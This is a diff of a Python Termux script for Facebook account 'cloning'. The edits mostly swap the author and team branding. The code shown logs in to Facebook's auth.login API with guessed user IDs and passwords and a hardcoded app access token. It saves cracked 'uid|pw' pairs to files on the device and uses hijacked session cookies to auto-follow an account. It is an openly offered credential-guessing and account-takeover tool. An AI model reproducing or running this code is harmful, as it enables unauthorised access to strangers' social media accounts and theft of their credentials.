@@ -1,6 +1,6 @@
-#Jenk
-#cute niya
-#FACEBOOK.COM/MANJIRO D SHIKI
+#
+#FB MANJIRO SHIKI
+#TT 12 INCH
 
 W = '\033[97;1m'
 R = '\033[91;1m'
@@ -373,10 +373,10 @@ def free(idf,pwv):
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [JENK-OK] {idf} * {pw}')
+				print(f'\r\x1b[1;92m [WASIM-OK] {idf} * {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/JENK-OK','a').write('%s\n' % wrt)
+				open('/sdcard/WASIM-OK','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
  
@@ -392,13 +392,12 @@ def follow(ses,coki):
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
  
 logo = """
-\033[1;95mSubukan mo lang please 
-                                        
+\033[1;95m SUBUIN NYO TT KO MGA TERMUX BOY
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••• 
-\x1b[1;90m[+] 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞    :  Ahzemm Khœng   
-\x1b[1;91m[+] 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞   :   MANJIRO SHIKI
+\x1b[1;90m[+] 𝗔𝗨𝗧𝗛𝗢𝗥     :   JENK    
+\x1b[1;91m[+] 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞   :    MANJIRO SHIKI
 \x1b[1;92m[+] 𝗚𝗜𝗧𝗛𝗨𝗕      :   SECRET
-\x1b[1;98m[+] FROM         :   CYBER MILITIA PHILIPPINES 
+\x1b[1;98m[+] FROM        :   TT SQUADS 
 \x1b[1;93m[+] 𝗧𝗘𝗔𝗠        :   \33[1;42  BOT HACKER\33[0m
 \x1b[1;94m[+] 𝗩𝗘𝗥𝗦𝗜𝗢𝗡     :\x1b[1;97m  1.01   \x1b[1;97m          
 \033[1;80m•••••••••••••••••••••••••••••••••••••••••••••• 
@@ -414,7 +413,7 @@ class Main:
 		print(logo)
 		print("")
 		print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
-		print("\033[1;37mNOTE : APPROVAL KAY JENK  FOLLOW HIM ")
+		print("\033[1;37mNOTE : APPROVAL KAY JENK FOLLOW HIM ON FACEBOOK ")
 		print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ")
 		
 		
@@ -437,12 +436,12 @@ class Main:
 			input("\n\033[1;37m TYPE THE OWNER FACEBOOK ACCOUNT NAME \033[1;37m")
 			time.sleep(3.1)
 			print("")
-			print("\033[1;32m WELCOME TO *TH3 L3G3ND JENK*  TOOLS")
+			print("\033[1;32m WELCOME TO *TH3 L3G3ND FAISAL X HAYAT WORLD*  TOOLS")
 			time.sleep(3.0)
 			os.system("clear")
 		print(logo)
 		print(" [+]CHOOSE METHOD")
-		print ("\033[1;36m           CYBER WORLD WORLD")
+		print ("\033[1;36m           WELCOME SA TERMUX BATA")
 		print("\033[1;37m- - - - - - - - - - - - - - - - - - - - - - - - - - -")
 		print(" \033[1;32m[1]\033[0;92m File Cloning ")
 		print(" \033[1;32m[2] Public Cloning")
@@ -953,13 +952,13 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[1;32m[JENK-OK] %s | %s\033[0;32m         "%(uid, pw))
+				print("\r \033[1;32m[WASIM-OK] %s | %s\033[0;32m         "%(uid, pw))
 				print ("\r \033[1;32m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("JENK-OK.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("WASIM-OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[1;32m[JENK-OK] %s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[WASIM-OK] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("Successfull.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
